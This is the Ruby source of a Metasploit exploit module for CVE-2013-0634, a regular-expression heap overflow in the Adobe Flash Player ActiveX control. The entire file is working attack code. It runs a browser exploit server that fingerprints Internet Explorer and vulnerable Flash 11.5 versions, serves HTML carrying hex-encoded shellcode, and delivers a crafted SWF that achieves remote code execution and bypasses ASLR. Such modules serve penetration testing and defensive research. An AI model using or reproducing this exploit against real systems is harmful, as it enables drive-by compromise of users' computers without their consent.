##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Flash Player Regular Expression Heap Overflow",
      'Description'    => %q{
        This module exploits a vulnerability found in the ActiveX component of Adobe
        Flash Player before 11.5.502.149. By supplying a specially crafted swf file
        with special regex value, it is possible to trigger an memory corruption, which
        results in remote code execution under the context of the user, as exploited in
        the wild in February 2013. This module has been tested successfully with Adobe
        Flash Player 11.5 before 11.5.502.149 on Windows XP SP3 and Windows 7 SP1 before
        MS13-063, since it takes advantage of a predictable SharedUserData in order to
        leak ntdll and bypass ASLR.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown',                   # malware sample
          'Boris "dukeBarman" Ryutin', # msf exploit
          'juan vazquez'               # ActionScript deobfuscation and cleaning
        ],
      'References'     =>
        [
          [ 'CVE', '2013-0634' ],
          [ 'OSVDB', '89936'],
          [ 'BID', '57787'],
          [ 'URL', 'http://malwaremustdie.blogspot.ru/2013/02/cve-2013-0634-this-ladyboyle-is-not.html' ],
          [ 'URL', 'http://malware.dontneedcoffee.com/2013/03/cve-2013-0634-adobe-flash-player.html' ],
          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html' ],
          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2013/adobe-patches-two-vulnerabilities-being-exploited-in-the-wild/' ],
          [ 'URL', 'http://eromang.zataz.com/tag/cve-2013-0634/' ]
        ],
      'Payload'        =>
        {
          'Space' => 1024,
          'DisableNops' => true
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f',
          'Retries'              => false
        },
      'Platform'       => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :clsid   => "{D27CDB6E-AE6D-11cf-96B8-444553540000}",
          :method  => "LoadMovie",
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^11\.5/ && ver < '11.5.502.149' }
        },
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 8 2013",
      'DefaultTarget'  => 0))
  end
 
  def exploit
    @swf = create_swf
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
      return
    end
 
    print_status("Sending HTML...")
    tag = retrieve_tag(cli, request)
    profile = get_profile(tag)
    profile[:tried] = false unless profile.nil? # to allow request the swf
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end
 
  def exploit_template(cli, target_info)
 
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    shellcode = get_payload(cli, target_info).unpack("H*")[0]
 
    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="his=<%=shellcode%>" />
    <param name="Play" value="true" />
    </object>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2013-0634", "exploit.swf" )
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }
 
    swf
  end
 
end
